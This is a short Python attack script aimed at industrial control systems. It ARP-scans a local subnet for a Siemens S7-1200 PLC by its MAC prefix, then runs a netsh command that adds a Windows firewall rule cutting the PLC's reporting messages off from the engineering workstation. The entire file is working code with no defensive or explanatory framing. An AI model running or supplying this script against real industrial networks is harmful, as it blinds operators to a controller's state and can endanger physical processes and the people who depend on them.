from scapy.all import ARP, Ether, srp
import subprocess
import time

# Network configuration (Assuming a typical subnet)
NETWORK_RANGE = "192.168.1.0/24"  # Adjust to match your network

def find_siemens_plc():
    """Scan the network to find Siemens PLC based on known MAC address prefix."""
    print("[+] Scanning network for Siemens S7-1200 PLC...")

    # Send an ARP request to discover devices
    arp = ARP(pdst=NETWORK_RANGE)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=False)[0]

    # Siemens PLCs often have MAC addresses starting with: 00:0e:8c
    for sent, received in result:
        if received.hwsrc.lower().startswith("00:0e:8c"):
            print(f"[+] Siemens PLC found: IP {received.psrc}, MAC {received.hwsrc}")
            return received.psrc

    print("[-] No Siemens PLC found.")
    return None

def block_plc_communication(plc_ip):
    """Block communication between the engineering workstation and the PLC."""
    if not plc_ip:
        print("[-] No PLC IP found. Exiting.")
        return

    print(f"[+] Blocking reporting messages from PLC ({plc_ip})...")

    # Windows firewall command to block traffic from the PLC
    firewall_rule = f'netsh advfirewall firewall add rule name="Block PLC {plc_ip}" dir=in action=block remoteip={plc_ip}'
    
    try:
        subprocess.run(firewall_rule, shell=True, check=True)
        print(f"[+] Successfully blocked communication from {plc_ip}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error adding firewall rule: {e}")

if __name__ == "__main__":
    plc_ip = find_siemens_plc()
    time.sleep(1)
    block_plc_communication(plc_ip)